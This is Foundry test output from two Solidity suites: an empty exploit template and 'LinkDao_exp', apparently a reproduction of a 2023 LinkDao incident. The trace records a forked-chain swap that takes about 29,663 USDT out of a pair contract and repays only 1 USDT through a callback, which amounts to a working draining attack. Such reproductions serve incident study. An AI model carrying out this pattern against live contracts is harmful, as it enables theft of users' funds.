Compiling 22 files with Solc 0.8.28
Solc 0.8.28 finished in 1.08s
Compiler run successful!

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 517.13ms (3.58ms CPU time)

Ran 1 test for src/test/2023-11/LinkDao_exp.sol:LinkDao_exp
[PASS] test() (gas: 81164)
Traces:
  [3649] LinkDao_exp::setUp()
    ├─ [0] VM::createSelectFork("<rpc url>", 33527744 [3.352e7])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [83964] LinkDao_exp::test()
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de) [staticcall]
    │   └─ ← [Return] 29962986000000000000000 [2.996e22]
    ├─ [74317] 0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de::swap(29663356140000000000000 [2.966e22], 0, LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x313233)
    │   ├─ [10871] 0x55d398326f99059fF775485246999027B3197955::transfer(LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29663356140000000000000 [2.966e22])
    │   │   ├─ emit Transfer(from: 0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de, to: LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 29663356140000000000000 [2.966e22])
    │   │   ├─  storage changes:
    │   │   │   @ 0x60c7eba5b8237e714ddb45a0d7a1e235a7b65013f7d5e76b91058b7cafba3662: 0x0000000000000000000000000000000000000000000006584bf6384be2710000 → 0x0000000000000000000000000000000000000000000000103e331a29b8064000
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000000016fe6708b439b0000 → 0x0000000000000000000000000000000000000000000006497da98ead6e05c000
    │   │   └─ ← [Return] true
    │   ├─ [4672] LinkDao_exp::dc6eaaa9(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000006480dc31e222a6ac0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000033132330000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de, 1000000000000000000 [1e18])
    │   │   │   ├─ emit Transfer(from: LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de, value: 1000000000000000000 [1e18])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000006497da98ead6e05c000 → 0x0000000000000000000000000000000000000000000006496fc8d7f9c6a1c000
    │   │   │   │   @ 0x60c7eba5b8237e714ddb45a0d7a1e235a7b65013f7d5e76b91058b7cafba3662: 0x0000000000000000000000000000000000000000000000103e331a29b8064000 → 0x0000000000000000000000000000000000000000000000104c13d0dd5f6a4000
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de) [staticcall]
    │   │   └─ ← [Return] 300629860000000000000 [3.006e20]
    │   ├─ [2531] 0xaF027427DC6d31A3e7e162A710a5Fe27e63E275F::balanceOf(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de) [staticcall]
    │   │   └─ ← [Return] 48277499838300344044804 [4.827e22]
    │   ├─ [2315] 0x717D0A192F4C5F9Bc8A2D45b01D696Dab2bD1b7A::getFeePercentage() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000019
    │   ├─ [2359] 0x717D0A192F4C5F9Bc8A2D45b01D696Dab2bD1b7A::getTreasuryPercentage() [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000003e8
    │   ├─ [2336] 0x717D0A192F4C5F9Bc8A2D45b01D696Dab2bD1b7A::ce0a653a() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000bb8
    │   ├─ [2327] 0x717D0A192F4C5F9Bc8A2D45b01D696Dab2bD1b7A::getTotalFeePercentage() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000002710
    │   ├─ emit Sync(: 300629860000000000000 [3.006e20], : 48277499838300344044804 [4.827e22])
    │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986000000000000 [9.86e14])
    │   │   ├─ emit Transfer(from: 0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de, to: LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 986000000000000 [9.86e14])
    │   │   ├─  storage changes:
    │   │   │   @ 0x60c7eba5b8237e714ddb45a0d7a1e235a7b65013f7d5e76b91058b7cafba3662: 0x0000000000000000000000000000000000000000000000104c13d0dd5f6a4000 → 0x0000000000000000000000000000000000000000000000104c10501a5baaa000
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000006496fc8d7f9c6a1c000 → 0x0000000000000000000000000000000000000000000006496fcc58bcca616000
    │   │   └─ ← [Return] true
    │   ├─  storage changes:
    │   │   @ 9: 0x00000000000000000000000000000000098b4db9c9afd68f590248437e72d423 → 0x00000000000000000000000000000000130aa918985eedac5516c14970258ff3
    │   │   @ 10: 0x0000000000000000000000000000000003ab64e3b267ac0b72cd6f9f53004d74 → 0x000000000000000000000000000000000753f1062b1a63ea8fae140cec286838
    │   │   @ 8: 0x655551f1000000000a3920e60dc70e584d040000000006584c27f538e54c0000 → 0x655557d6000000000a3920e60dc70e584d040000000000104c13d0dd5f6a4000
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000008c1e7895f10000000000000000000000000000000000000000000000000000000000000000000
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.56s (4.31s CPU time)

Ran 2 test suites in 6.37s (6.07s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
